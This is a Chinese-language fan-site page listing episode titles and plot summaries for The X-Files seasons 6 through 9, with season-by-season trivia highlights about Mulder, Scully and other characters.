6X12 父与子(下) One Son辛迪加抓到了Spender的母亲和MS。Mulder了解到如果殖民方alien知道混种研究已经成功，殖民就会开始，而辛迪加故意拖延研究混种并一直隐瞒真相是为了赢得研制疫苗的时间。意识到叛军的力量已是无法阻止的，CSM等辛迪加决定把Spender的母亲交给殖民方，让殖民开始，以保存自己。但叛军先行一步，最终夺走的Spender的母亲，烧死了除CSM外的所有辛迪加成员。CSM杀死了自己的儿子Spender。  6X13 美丽新社区 Arcadia Mulder和Scully伪装成一对夫妇来到一个秩序井然的美丽社区调查居民失踪案，发现一切是由懂远东意念术的人用泥土创造的幻人所为。  6X14 水怪 Agua Mala 佛罗里达的暴风雨把深海的一种生物带到了小城的排水系统中。这种只能在咸水中生存的生物能把人融解为水。5X15中的前X档案探员请MS来帮助解决这个问题。  6X15 星期一 MondayMulder每天醒来都回到同一个星期一，经历同样的事情却毫不知情。只有一个女子知道要逃离这无间地狱，必须改正一件错误的事情。  6X16 变形犬 Alpha 一名到中国寻找失落的王山犬的教授获得了变身成动物的能力，开始无法控制杀人的欲望。  6X17 穿墙人 Trevor一名囚犯在一场风暴中意外获得了身体穿越固体的能力。他逃出了监狱，想要找回自己的儿子。  6X18 爱情小说 Milagro 暗恋Scully的小说家为了接近Scully，在小说中创作了完美的犯罪，小说中的杀手来到现实中执行了这些罪行。在了解到Scully心有所属后，小说家不知如何结尾了，而小说中的杀手告诉他应该杀死Scully。  6X19 难兄难弟 Three of A Kind孤枪侠Byers自从1990年后就一直在寻找的那名女子现身拉斯维加斯。他们为她能摆脱阴谋和追杀，请来了Scully帮忙。  6X20 快乐人生 The Unnatural 5X15中的前X档案探员有个双胞胎兄弟，给Mulder讲了一个发生在1947年的故事，有关alien、赏金杀手、棒球，还有单纯的快乐。  6X21 田野之旅 Field Trip北卡罗来纳州的布朗山附近长了一种蘑菇，通过释放出的孢子让人产生非常真实的幻觉，睡梦中的人却作为这些蘑菇的营养慢慢被消化了。  6X22 创世纪 Biogenesis 非洲象牙海岸发掘出了写有符号的飞船碎片，发现碎片的相关科学家纷纷被谋杀。这些碎片让Mulder脑海中听到无数声音并同痛不欲生。Scully发现碎片上的符号可能是人类的基因蓝图。Mulder被关进了精神病院。Scully来到象牙海岸，看到半埋在沙滩中的飞船。  第7季详细剧情介绍  7X01 我想做好人 Hungry一个基因变种人有着无法抑止的吃人脑的欲望。但他想做个好人。  7X02 幸运儿 The Goldberg Variation 一个善良的家伙有着难以置信的好运气，他和懂得平衡自己拥有的好运，并运用它们来攒钱帮助一个肾衰竭的孩子做肾移植手术。  7X03 第六次大灭绝（上） The Sixth Extinction Mulder在医院被Fowley监管着。他想办法请来了Skinner和Kritschgau来帮忙，他们了解到Mulder拥有了CIA一直在研究的读心术。Scully在象牙海岸寻找治愈Mulder的办法。Mulder的病情加重了。  7X04 第六次大灭绝（下） The Sixth Extinction II: Amor Fati Kritschgau指出Mulder现在的情况是因为曾感染黑油，飞船碎片的出现激活了黑油发生作用。CSM知道Mulder现在是继Spender的母亲之后又一例成功alien/人类混种，而且是更加稳定无排斥的品种。他带走Mulder，实施手术移植他的脑部遗传物质到自己身上。Mulder一直在做梦，梦中他在CSM的诱惑下经历了完全不同的人生。  7X05 千禧计划 Millennium 一个叫做千禧组织的邪教团体召唤了四个活死人，意图通过仪式迎接世纪末的世界末日。Mulder和Scully找到曾是千禧组织成员之一的前FBI探员帮助破案。  7X06 急速快感 Rush几个孩子发现了一个山洞的秘密，被洞里的神秘光线照过之后，他们能够以肉眼捕捉不到的高速运动。  7X07 替天行道 Orison 2X13里的恋物癖被一个传教士出于替天行道的目的放出了监狱，但他低估了这个变态的邪恶程度。Scully再次成为了这个变态的目标。  7X08 魔术大师 The Amazing Maleeni 魔术大师马里尼在完成他的绝技——头颅旋转180度的表演后，被发现尸首分离死在自己的货车上，另一个与他有瓜葛的魔术师成为了嫌疑犯。Mulder和Scully却发现这一切可能只是场魔术骗局。  7X09 不义之徒 Signs & Wonders 传教士Mackey的和善外表下是恶魔的心，只有同一教区的另一位另类神父看穿了他。Mackey使用种种卑劣手段打击栽赃这位神父。连Mulder和Scully都被他们的外表欺骗了。  7X10 生命的奇迹（上） Sein Und Zeit发生了多宗儿童绑架案。Mulder认为案件和Samantha的失踪有关。追随线索，他们发现凶手是个嗜杀儿童的杀人狂。Mulder的母亲自杀了。  7X11 生命的奇迹（下） Closure被杀的儿童里没有Samantha。但有个人通过这个案件联系上Mulder，声称能帮Mulder找到他妹妹。最后Mulder终于知道Samantha很早就死了，她的灵魂和许多其他奇异失踪的孩子的灵魂在一起，安全而快乐。Mulder自由了。  7X12 Ｘ警察 X-Cops X档案与Cops的Crossover，忠实记录了Mulder和Scully协助警方追捕月圆之夜的“怪物”——恐惧的过程。  7X13 虚拟战斗 First Person Shooter 游戏公司测试虚拟现实第一人称射击游戏时，测试人员意外死于游戏中——被一个非游戏角色的虚拟人物杀死。Mulder和Scully全副武装进入游戏调查真相。  7X14 夺命魔咒 Theef 誉满业界的医生曾经为一名无治疗希望的病人实施了安乐死。病人的父亲认为医生是杀手，决心用巫术报复医生全家。  7X15 尔虞我诈 En AmiCSM利用Scully达成他的目的，在Scully和CSM的合作过程中，她多少了解到了他的另一面。  7X16 贤妻良母 Chimera 善良能干的妻子对丈夫偷情视而不见，宁愿默默忍受也要维护家庭的幸福。但忍受到了极限就一定会爆发，她变成了连自己都不认识的怪物。  7X17 人生旅途 all things Mulder匆匆赶去英国看麦田怪圈，Scully留在华盛顿遇到了自己的旧情人，让她有机会对自己做出的选择进行了深刻的反省。  7X18 超级烟草 Brand X Morley烟草公司利用转基因技术培育新品种烟草，却意外改造出了致命的烟草甲虫。Mulder成为了甲虫的受害者，生命垂危。  7X19 好莱坞式Ｘ档案 Hollywood A.D. Mulder和Scully发现了耶稣让拉撒路复活时使用过的陶土碗。好莱坞把他们的经历拍成了电影，请Skinner担任副制片人。  7x20 斗阵俱乐部 Fight Club 通过捐献精子由同父异母所生的一对完全相像的双胞胎相遇，周围的人们便会莫名其妙地陷入疯狂。两对这样的双胞胎在全是摔角迷的摔角赛场相遇……  7x21 三个愿望 Je Souhaite来自法国的古老的地毯精灵被释放了，她能满足任何释放她的人任意三个愿望。  7x22 安魂曲 Requiem Mulder和Scully回到他们第一次合作办案的厄勒冈，调查当地一起飞船坠毁事件。CSM自从手术后就身体欠佳，听到消息异常兴奋，认为是复兴计划的机会，派出Krycek寻找飞船。MS发现，曾被劫持过的人现在又开始一一失踪了，他担心Scully的安全。但是，最后被飞船和赏金杀手带走的却是Mulder。Krycek无情地杀死了CSM。Scully怀孕了。  第8季by carmanshuai  8x01 Within 寻获Agent Doggett被派来协助调查Mulder的失踪，Scully泼了他一杯水。  8x02 Without 离散Scully认为找到Gibson就能找到Mulder，他们在沙漠里找到了Gibson。  8x03 Patience 忍耐Scully和Agent Doggett去调查一个蝙蝠人的案子。  8x04 Roadrunners 寄生邪神一个宗教团体把Scully困在了一个小镇上，还把一个恶心的生物放在了她身体里，完全不顾她已经怀孕了，Agent Doggett及时赶到，帮她取了出来。  8x05 Invocation 幽灵兄弟一个1990年消失的孩子又出现了，还是他消失时那样大，七岁，他回来抓绑架他的坏蛋。  8x06 Redrum 时光倒流一个黑人一觉醒来发觉自己在监狱中，以后每天早上醒来都是前一天，他被指控谋杀了自己的妻子。  8x07 Via Negativa 心魔一个宗教团体的头可以进入别人的梦中用斧子将做梦的人杀死。  8x08 Surekill 完美谋杀案一个人拥有X-Ray眼。  8x09 Salvage 异变Scully和Agent Doggett调查一个可能由于暴露于不知名金属合金的人的杀人事件。  8x10 Badlaa 寄身人一个印度无腿人能钻进人的身体里。  8x11 The Gift 生命的意义Agent Doggett调查Mulder失踪前不久的事情，Doggett死而复生。  8x12 Medusa 地铁惊魂在地铁站里发现了绿绿的水母。  8x13 Per Manum 疑问许多妇女生出了alien baby被她们的医生用做实验，Scully的医生也参与了，Scully想知道自己的孩子是否正常。通过Scully的回忆，确定Mulder曾经为Sully捐精，当时没有成功，不过后来Sully奇迹般的怀孕了。  8x14 This Is Not Happening 奇迹Mulder被发现死了。  8x15 Deadalive 生与死Mulder葬礼后3个月后被挖出来，又活了。  8x16 Three Words 对抗未来一个人声称美国要被alien接管了，他有一张“fight the future”的CD。  8x17 Empedocles 邪火传承可能杀死Doggett儿子的灵魂无休止的付在别人的身上，不停的杀人。  8x18 Vienen 外星异种Mulder和Doggett到一个海上的钻井平台上调查被黑油感染的工人。  8x19 Alone 变异爬虫一个MS的崇拜者暂时代替休产假的Scully和Agent Doggett一起调查一个可以变成爬行动物的人的案子。Scully把Mulder送给她的阿波罗11号登月的钥匙扣送给了Agent Doggett。  8x20 Essence 奔逃一个SculLy的妈妈请来的保姆换了Scully的药，大家都来保护Sully不受super soldier的追杀。  8x21 Existence 启明排除万难，SculLy终于有了她的孩子，William。MS拥吻。  第9季by sapphire  Nothing Important Happened Today&nbsp;&nbsp; 9x-01&nbsp;&nbsp; 氯胺疑魂（上）Doggett不顾众人的阻拦坚持调查，他开始着手调查一个环保署职员死亡的案件。  Nothing Important Happened Today II&nbsp;&nbsp; 9x-02&nbsp;&nbsp; 氯胺疑魂（下）Doggett发现政府利用在饮用水中加入经分子改造后的氯胺的方法来制造supersoldier。  Daemonicus&nbsp;&nbsp; 9x-03&nbsp;&nbsp; 撒旦回归一个研究撒旦的前大学教授现精神病人设计从精神病院中逃脱。  Hellbound&nbsp;&nbsp; 9x-04&nbsp;&nbsp; 地狱旅程一百多年前死去的一个人不停地转世，用剥皮的方法杀死由那一世里四个凶手转世的人。  4-D&nbsp;&nbsp; 9x-05&nbsp;&nbsp; 镜像空间一个人能自由地穿梭于平行宇宙，他在其中一个宇宙杀死了Monica，打伤了Doggett。  Lord of the Files&nbsp;&nbsp; 9x-06&nbsp;&nbsp; 蝇一个男孩因遗传而具有类似苍蝇的特殊生理结构，能招来虫子。  John Doe&nbsp;&nbsp; 9x-07&nbsp;&nbsp; 心灵捕手Doggett调查一个银行家来到墨西哥，他被清除了记忆。  Trust No 1&nbsp;&nbsp; 9x-08&nbsp;&nbsp; 信任危机Supersoldier骗取了Scully的信任，引诱Mulder出现，想杀死Mulder。Scully和Doggett发现磁铁矿能杀死supersoldier。  Underneath&nbsp;&nbsp; 9x-09&nbsp;&nbsp; 心魔一个人具有双重人格，能化身为另一个人杀人。  Provenance&nbsp;&nbsp; 9x-10&nbsp;&nbsp; 天命（上）一个FBI探员来杀死Scully的孩子，另一个崇拜UFO的组织绑架了William，企图保护他。  Providence&nbsp;&nbsp; 9x-11&nbsp;&nbsp; 天命（下）崇拜UFO的组织绑架了William，Scully又找回了他。  Scary Monsters&nbsp;&nbsp; 9x-12&nbsp;&nbsp; 幻想成真一个小男孩会因为恐惧而产生幻想，这些幻想出的虫子能够真的把人杀死。  Audrey Pauley&nbsp;&nbsp; 9x-13&nbsp;&nbsp; 再生情缘一个医院的护工建造了一座医院的模型，医院中脑死亡的病人的灵魂都会停留在其中直到死去。  Improbable&nbsp;&nbsp; 9x-14&nbsp;&nbsp; 寻凶记一个凶手依据数字命理学的计算结果来选择受害人。  Jump the Shark&nbsp;&nbsp; 9x-15&nbsp;&nbsp; 异类病毒Lone Gunmen为了保护人们不被扩散的病毒感染而牺牲。  Release&nbsp;&nbsp; 9x-16&nbsp;&nbsp; 解开心结Doggett重新调查自己的儿子被害的案件。  William&nbsp;&nbsp; 9x-17&nbsp;&nbsp; 母与子怀疑是Mulder的人企图伤害William，Scully决定把William送给别人抚养。  Sunshine Days&nbsp;&nbsp; 9x-18&nbsp;&nbsp; 美丽人生（阳光灿烂的日子）一个拥有超能力的人因为孤独而用超能力幻想出30年代电视剧中的美满家庭。  The Truth&nbsp;&nbsp;&nbsp;&nbsp; 9x-19&nbsp;&nbsp; 真相（上）The Truth II&nbsp;&nbsp; 9x-20&nbsp;&nbsp; 真相（下）Mulder闯入秘密军事基地而被控谋杀，众人合力帮Mulder逃脱。Mulder带Scully到新墨西哥寻找真相。晚上，M&amp;S在旅馆中相拥而眠。__________  本文版权归X档案中文网及作者所有，任何性质的转载请注明出处。"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/x-files-directory-and-plot-introduction/ itemprop=url class=post-title-link>X-Files 目录及剧情简介</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 13:58:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 13:58:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
</span><span class=post-meta-item-text title=更新于>更新于：
</span><time title="修改时间：2008年03月29日 13:59:00 CST" itemprop="dateModified dateLastmod" datetime="2008-03-29 13:59:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/x-files-directory-and-plot-introduction/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>X-Files 第（1）季目录及剧情简介<br>1X01 领航员 Pilot<br>1X02 深喉咙 DEEP THROAT<br>1X03 突变异种 SQUEEZE<br>1X04 奥卡布基湖奇案 CONDUIT<br>1X05 泽西恶魔 THE JERSEY DEVIL<br>1X06 鬼魅阴影(幽魂) SHADOWS<br>1X07 幽灵电脑 GHOST IN THE MACHINE<br>1X08 冰核计划 ICE<br>1X09 太空惊魂 SPACE<br>1X10 坠落天使 FALLEN ANGEL<br>1X11 夺命夏娃 EVE<br>1X12 恶魔烈火 FIRE<br>1X13 心灵感应 BEYOND THE SEA<br>1X14 性别扭曲 GENDERBENDER<br>1X15 至死不渝 LAZARUS<br>1X16 追命恶魔 YOUNG AT HEART<br>1X17 外星访客 E.B.E.<br>1X18 神迹 MIRACLE MAN<br>1X19 变形狼人 SHAPES<br>1X20 夜幕低垂 DARKNESS FALLS<br>1X21 终结突变异种 TOOMS<br>1X22 附身 BORN AGAIN<br>1X23 双胞奇缘 ROLAND<br>1X24 外星混血 THE ERLENMEYER FLASK<p>在第一季里．．．<br>　* Mulder和Scully相识并成为搭档。（领航员）<br>　* Scully在Mulder面前宽衣解带，给他看她的后腰。（领航员）<br>　* Scully撞到Mulder和旧情人在接吻，并表现出了一丝丝的嫉妒。（恶魔烈火）<br>　* Scully的父亲去世，他在步入天堂之前匆匆拜访了Scully。（心灵感应）<br>　* Scully被一名占据了他前任男友身体的罪犯绑架，这是她第一次被绑架。（至死不渝）<br>　* 孤枪侠首次出场。Frohike说Scully很“诱人”。（外星访客）<br>　* Mulder骗Scully说他从不让别人叫他“Fox”。（终结突变异种）<br>　* Mulder被绑架了，Scully偷了一个外星人胚胎去交换他。（外星混血）<br>　* X档案被关闭，Mulder和Scully被分开。（外星混血）<br>2005-4-14 14:17 龙骑兵<br>X-Files 第（2）季目录及剧情简介<br>2X01 绿色小矮人 LITTLE GREEN MEN<br>2X02 下水道惊魂记 THE HOST<br>2X03 恐惧症 BLOOD<br>2X04 不能睡的人 SLEEPLESS<br>2X05 第四类接触(上) DUANE BARRY<br>2X06 第四类接触(下) ASCENSION<br>2X07 三位一体 3<br>2X08 起死回生 ONE BREATH<br>2X09 火山口惊魂 FIREWALKER<br>2X10 红色博物馆 RED MUSEUM<br>2X11 再生 EXCELSIUS DEI<br>2X12 剃刀杀人狂 AUBREY<br>2X13 摧花狂疑云 IRRESISTIBLE<br>2X14 巫教学校 DIE HAND DIE VERLETZT<br>2X15 巫毒的复仇 FRESH BONES<br>2X16 殖民地球(上) COLONY<br>2X17 殖民地球(下) END GAME<br>2X18 审判 FEARFUL SYMMETRY<br>2X19 幽灵船 DOD KALM<br>2X20 斑身人 HUMBUG<br>2X21 巫童 THE CALUSARI<br>2X22 剖尸 F. EMASCULATA<br>2X23 柔光 SOFT LIGHT<br>2X24 我们的小镇 OUR TOWN<br>2X25 外星档案(上) ANASAZI<p>在第二季里．．．<br>* Mulder偷偷跑去南美丛林寻找外星人，Scully赶去援救他。（绿色小矮人）<br>　* Alex Krycek首次亮相。（不能睡的人）<br>　* Gillian Anderson怀孕了。<br>　* Scully再次被绑架了，这次是外星人干的。于是GA就有时间去生孩子了。（第四类接触(下)）<br>　* X档案重新开启。（第四类接触(下)）<br>　* Mulder有了在整部影集播出中唯一的一次性行为，也许直到第七年为止。（三位一体）<br>　* Melissa Scully首次出场。（起死回生）<br>　* Scully被外星人送了回来，并险些因为她的家人移除了她的维生装置而死亡。（起死回生）<br>　* 我们知道了Skinner原来曾是一名海军陆战队员，在越南受重伤时经历了灵魂出体的体验，但最终活了来下来并告诉我们这一切。（起死回生）<br>　* Scully又被绑架了，这次绑架她的是Donnie Pfaster，一个恶魔化身的死亡崇拜者。（摧花狂疑云）<br>　* 当看到一名成年妇女声称自己是Samantha Mulder时，我们第一次上了个大当。（殖民地球(上)）<br>　* 又一次，Scully被一名外星赏金猎人绑架了，Mulder用他的“妹妹”做了交换。（殖民地球(下)）<br>　* Scully在医院发威，指挥医生们治疗从其北极之旅归来的Mulder，救活了他的命。（殖民地球(下)）<br>　* Scully再一次地被绑架了，这次是一群食人族。她还几乎被斩首，变成镇里的人的盘中餐。（我们的小镇）<br>　* Mulder被人下了毒，并在胡佛大厦的走廊里和Skinner打了一架。（外星档案(上)）<br>　* Mulder的父亲被谋杀了。（外星档案(上)）<br>　* Scully开枪打伤了Mulder，然后带着他驾车穿越整个美国，并细心照顾他直到他康复，于是癌人就能够把他困在被掩埋的列车车厢里，并试图烧死他。（外星档案(上)）<br>2005-4-14 14:18 龙骑兵<br>X-Files 第（3）季目录及剧情简介<br>3X01 外星档案(中) THE BLESSING WAY<br>3X02 外星档案(下) PAPER CLIP<br>3X03 闪电人 D.P.O.<br>3X04 相士杀手 CLYDE BRUCKMAN'S FINAL REPOSE<br>3X05 回魂复仇者 THE LIST<br>3X06 网络情人 2SHY<br>3X07 幽灵士兵 THE WALK<br>3X08 解脱 OUBLIETTE<br>3X09 扑朔迷离(上) NISEI<br>3X10 扑朔迷离(下) 731<br>3X11 天启 REVELATIONS<br>3X12 粪虫大战 WAR OF THE COPROPHAGES<br>3X13 双姝奇缘 SYZYGY<br>3X14 恶魔图像 GROTESQUE<br>3X15 追凶记(上) PIPER MARU<br>3X16 追凶记(下) APOCRYPHA<br>3X17 步步危机 PUSHER<br>3X18 阿玛鲁 TESO DOS BICHOS<br>3X19 冥纸 HELL MONEY<br>3X20 科幻故事 JOSE CHUNG'S 'FROM OUTER SPACE'<br>3X21 梦妖 AVATAR<br>3X22 湖怪 QUAGMIRE<br>3X23 电视杀人事件 WETWIRED<br>3X24 追杀令 TALITHA CUMI<p>在第三季里．．．<br>* Scully被停职，Mulder被认为已经死了。（外星档案(中)）<br>　* Scully发现了她脖子后的植入物，并把它取了出来。（外星档案(中)）<br>　* Scully用枪指着Skinner，Skinner用枪指着Scully，Mulder用枪指着Skinner。这是个墨西哥平局！（外星档案(中)）<br>　* Krycek和Luis Cardinale意外地杀害了Scully的姐姐Melissa。当然，他们原来是想杀Scully的。（外星档案(中)）<br>　* Skinner对癌人说“噘起你的老嘴亲我的P股”。（外星档案(下)）<br>　* Willianm B. Davis（癌人）证明了这已超出他的表演能力范围。（外星档案(下)）<br>　* Clyde Bruckman告诉Scully她是不会死的。（相士杀手）<br>　* Scully领养了一只狗。（相士杀手）<br>　* Scully吸烟了。（双姝奇缘）<br>　* 他们用Gillian Anderson女儿的名字[Piper]为这集命名。（追凶记(上) Piper Maru）<br>　* Skinner被用于杀害Scully姐姐的同一支枪击中了。（追凶记(下)）<br>　* Mulder在和Robert Modell玩俄罗斯轮盘赌时，差点儿向Scully开枪。（步步危机）<br>　* 我们了解到原来Skinner已经结过婚。他与一名妓女发生了关系，并由于他的睡眠紊乱症而有可能在睡梦中杀害了她，他的妻子也去世了--可能。（梦妖）<br>　* Scully的狗--魁魁格，被一只美洲鳄吃掉了。（湖怪）<br>　* Mulder险些被同一只美洲鳄吃掉。（湖怪）<br>　* Scully被洗了脑，差点儿杀死Mulder。也可能是因为Scully的妈妈一直走在他前面，他才幸免于难。（电视杀人事件）<br>2005-4-14 14:20 龙骑兵<br>X-Files 第（4）季目录及剧情简介<br>4X01 颠覆地球 HERRENVOLK<br>4X02 灵异照片 UNRUHE<br>4X03 故乡 HOME<br>4X04 非洲邪灵 TELIKO<br>4X05 前世今生 THE FIELD WHERE I DIED<br>4X06 整型专家 SANGUINARIUM<br>4X07 癌人秘辛 MUSINGS OF A CIGARETTE SMOKING MAN<br>4X08 偷心人 PAPER HEARTS<br>4X09 非常手段(上) TUNGUSKA<br>4X10 非常手段(下) TERMA<br>4X11 紫雨 EL MUNDO GIRA<br>4X12 婚礼 KADDISH<br>4X13 再见贝蒂 NEVER AGAIN<br>4X14 无头尸奇案 LEONARD BETTS<br>4X15 我要活下去 MEMENTO MORI<br>4X16 复仇使者 UNREQUITED<br>4X17 失踪的九分钟(上) TEMPUS FUGIT<br>4X18 失踪的九分钟(下) MAX<br>4X19 回到过去 SYNCHRONY<br>4X20 外星爹地 SMALL POTATOES<br>4X21 天花蜂 ZERO SUM<br>4X22 免于恐惧 ELEGY<br>4X23 恶魔 DEMONS<br>4X24 真相与谎言 GETHSEMANE<p>在第四季里．．．<br>* Mulder的母亲中风了。（颠覆地球）<br>　* Mulder和Scully交换了各自的家族遗传史。不幸的是，他们当时还不知道Scully不孕，而且无法提供乳汁给他们俩的宝宝（呃，也许吧！）（故乡）<br>　* Scully又被绑架，并险些被切除了前额脑叶。（灵异照片）<br>　* Mulder在回忆前世时自欺欺人。（前世今生）<br>　* Scully因为藐视法庭被关进监狱。（非常手段(下)）<br>　* Mulder被感染“黑癌”。（非常手段(下)）<br>　* Krycek的左臂被切除。（非常手段(下)）<br>　* Scully获知她得了癌症。（无头尸奇案；我要活下去）<br>　* Scully有了一次心理上的认同转折点，并有可能有了整部影集中唯一一次的性行为（也许第七年那次除外）。（再见贝蒂）<br>　* Scully刺了个纹身！（再见贝蒂）<br>　* Scully告诉Mulder她患了癌症，但没有告诉她妈妈！（我要活下去）<br>　* Mulder发现在第二年里Scully被外星人绑架时，她所有的卵子都被偷走了，并且还找回了一些。（我要活下去）<br>　* Scully差点儿亲吻了Mulder，除了那不是真正的Mulder，而是会改变肌肉形状的Eddie Van Blundht。（外星爹地）<br>　* 我们看到Skinner只穿着他的底裤！不错！（天花蜂）<br>　* Scully看到了鬼魂，因为她也快死了。（免于恐惧）<br>　* Mulder偷偷跑去罗德岛，然后因为谋杀罪被捕，穿着一件亮橙色的囚服在监狱过了一夜，然后被Scully救了。（恶魔）<br>　* Mulder自杀了……也许吧。（真相与谎言）<br>2005-4-14 14:21 龙骑兵<br>X-Files 第（5）季目录及剧情简介<br>5X01 惊爆点 Unusual Suspects<br>5X02 追求真理(上) Redux<br>5X03 追求真理(下) Redux II<br>5X04 人兽谜 Detour<br>5X05 孤寂之旅(上) Christmas Carol<br>5X06 科学怪人 Post-Modern Prometheus<br>5X07 孤寂之旅(下) Emily<br>5X08 猎狐计划 Kitsunegari<br>5X09 杀父真凶 Schizogeny<br>5X10 恐怖娃娃 Chinga<br>5X11 魔脑 Kill Switch<br>5X12 新版吸血鬼 Bad Blood<br>5X13 Ｘ病人(上) Patient X<br>5X14 Ｘ病人(下) The Red and The Black<br>5X15 旅人 Travelers<br>5X16 心眼 Mind's Eye<br>5X17 心灵告白 All Souls<br>5X18 非常卧底 The Pine Bluff Variant<br>5X19 双疯 Folie A Deux<br>5X20 神童 The End<p>在第五季里．．．<br>* Mulder被认为已经死了。（追求真理（上））<br>　* Scully对警察、Skinner和FBI长官说谎，骗他们说Mulder“死了”，然后因为病发倒进Skinner的臂弯。经诊断她的癌症已经扩散，于是她就呆在医院里等死。但Mulder毕竟还活着！（追求真理（上））<br>　* 我们见到了Bill Scully，他说Mulder是个“可怜的王八蛋”。（追求真理（下））<br>　* Mulder找到一枚芯片，并把它放入Scully的后脖子。她的癌症消退了。（追求真理（下））<br>　* 癌人被杀了。呃，当然不是真的，不过至少在这个季度接下来的单元里，我们不用再理会他了。（追求真理（下））<br>　* 在佛罗里达的未开垦丛林里，Scully让受伤的Muler躺在她的腿上过夜，还唱“Joy to the World”哄他睡觉。（人兽谜）<br>　* Scully和Mulder在雪尔的音乐会上共舞。（科学怪人）<br>　* Scully发现她有一个不是她自己生的亲生女儿。但最后她女儿死了。（孤寂之旅）<br>　* 我们见到了癌人的妻子，还有Scully差点儿被活活烧死。（Ｘ病人（上））<br>　* Scully看到了他死去的女儿。（心灵告白）<br>　* Mulder成了卧底。（非常卧底）<br>　* Mulder成了疯子。（双疯）<br>　* 我们认识了Mulder的另一位旧情人，Diana Fowley探员；Scully不信任她，一切呈现不祥之兆。<br>　* X档案办公室被烧毁。（神童）<br>　* 这期间…… 癌人又活跃了起来，真是不幸。<br>　* Mulder和Scully在走廊里差一点儿就接吻了。<br>　* Scully又被绑架，成了外星人胚胎成长的温床。<br>　* Mulder赶去南极营救Scully。电影编剧错把David Duchovny当成阿诺德·施瓦辛格了。<br>2005-4-14 14:22 龙骑兵<br>X-Files 第（6）季目录及剧情简介<br>6X01 开端 The Beginning<br>6X02 向前冲 Drive<br>6X03 百慕达惊梦 Triangle<br>6X04 梦境(上） Dreamland<br>6X05 梦境(下) Dreamland II<br>6X06 亲密关系 Terms Of Endearment<br>6X07 雨王 The Rain King<br>6X08 圣诞幽魂 How The Ghosts Stole Christmas<br>6X09 心灵杀手 Tithonus<br>6X10 S.R. 819 S. R. 819<br>6X11 父与子(上) Two Fathers<br>6X12 父与子(下) One Son<br>6X13 美丽新社区 Arcadia<br>6X14 水怪 Agua Mala<br>6X15 星期一 Monday<br>6X16 变形犬 Alpha<br>6X17 穿墙人 Trevor<br>6X18 爱情小说 Milagro<br>6X19 难兄难弟 Three of A Kind<br>6X20 快乐人生 The Unnatural<br>6X21 田野之旅 Field Trip<br>6X22 创世纪 Biogenesis<p>在第六季里．．．<br>* Mulder和Scully再次失去X档案。他们离开了Skinner的监督，被重新分配到Alvin Kersh副座的监管下。Spender和Fowley探员接手X档案。（开端）<br>　* Mulder吻了Scully，除了那不是真的她。Scully给了Mulder一记右勾拳，除了那不是真的她。（百慕达惊梦）<br>　* Mulder告诉真的Scully他爱她；她说“哦老兄”，然后走开。（百慕达惊梦）<br>　* Scully在电梯里吻了Skinner。Skinner看上去害羞极了。（百慕达惊梦）<br>　* Mulder有了一间卧室和一张水床。（梦境（下））<br>　* Mulder和Scully在一栋闹鬼的房子里共度圣诞前夜，并向对方开枪，但不是真的开枪。（耶诞幽魂）<br>　* 在遇到一头飞来的牛后，Mulder和Scully不得不共享一间汽车旅馆房间，但我们看不到里面！（雨王）<br>　* Victoria Jackson吻了Mulder。Mulder看上去害羞极了。（雨王）<br>　* Krycek用纳米机器人感染了Skinner，并因此控制了他。（S.R. 819）<br>　* Scully被另一名FBI探员开枪打中腹部，并因此获得永生。Clyde Bruckman说的没错。（心灵杀手）<br>　* 我们知道了癌人的名字，大概是C.G.B. Spender什么的。（父与子(上)）<br>　* Mulder和Scully一起淋浴。（父与子(下)）<br>　* 阴谋联盟里的大部分成员都被干掉了（但没有癌人，该死！）。（父与子(下)）<br>　* Mulder和Scully重新拥有了X档案。（父与子(下)）<br>　* 癌人杀死了他的儿子，Jeffrey Spender探员。不过在第九年里我们发现他还没死。（父与子(下)）<br>　* Mulder的水床漏了个洞。（星期一）<br>　* “Scully探员早已坠入了爱河。”（爱情小说）<br>　* 一个变态外科医生想要占有Scully的心（脏）。她对此只表现出了一点点的心烦意乱。（爱情小说）<br>　* Mulder和Scully打棒球。（快乐人生）<br>　* Mulder听到说话声。（创世纪）<br>2005-4-14 14:24 龙骑兵<br>X-Files 第（7）季目录及剧情简介<p>7X01 我想做好人 Hungry<br>7X02 幸运儿 The Goldberg Variation<br>7X03 第六次大灭绝（上） The Sixth Extinction<br>7X04 第六次大灭绝（下） The Sixth Extinction II: Amor Fati<br>7X05 千禧计划 Millennium<br>7X06 急速快感 Rush<br>7X07 替天行道 Orison<br>7X08 魔术大师 The Amazing Maleeni<br>7X09 不义之徒 Signs & Wonders<br>7X10 生命的奇迹（上） Sein Und Zeit<br>7X11 生命的奇迹（下） Closure<br>7X12 Ｘ警察 X-Cops<br>7X13 虚拟战斗 First Person Shooter<br>7X14 夺命魔咒 Theef<br>7X15 尔虞我诈 En Ami<br>7X16 贤妻良母 Chimera<br>7X17 人生旅途 all things<br>7X18 超级烟* Brand X<br>7X19 好莱坞式Ｘ档案 Hollywood A.D.<br>7x20 斗阵俱乐部 Fight Club<br>7x21 三个愿望 Je Souhaite<br>7x22 安魂曲 Requiem<p>在第七季里．．．<p>　* Mulder发了狂，还拥有了读心术。Scully去了非洲。（第六次大灭绝（上））<br>　* Mulder重新演绎了[基督最后的诱惑]。（第六次大灭绝（下））<br>　* Mulder做了脑部手术。癌人也做了。（第六次大灭绝（下））<br>　* 癌人告诉Mulder他是他的父亲。（第六次大灭绝（下））<br>　* Scully再次救了Mulder的命。（第六次大灭绝（下））<br>　* Fowley探员被从镜头前干掉了。她好像不会再回来了。（第六次大灭绝（下））<br>　* Scully被一个她明明知道已经死了人攻击。Mulder被好几个他明明知道已经死了的人攻击。（千禧计划）<br>　* Mulder在新年前夜吻了Scully，这次是真的。她看起来一点也不激动。（千禧计划）<br>　* Donnie Pfaster从监狱逃了出来，并四处追逐Scully，他把她叫做“逃脱者”。Scully杀死了他，尽管没有必要。干得好，女孩儿！（替天行道）<br>　* 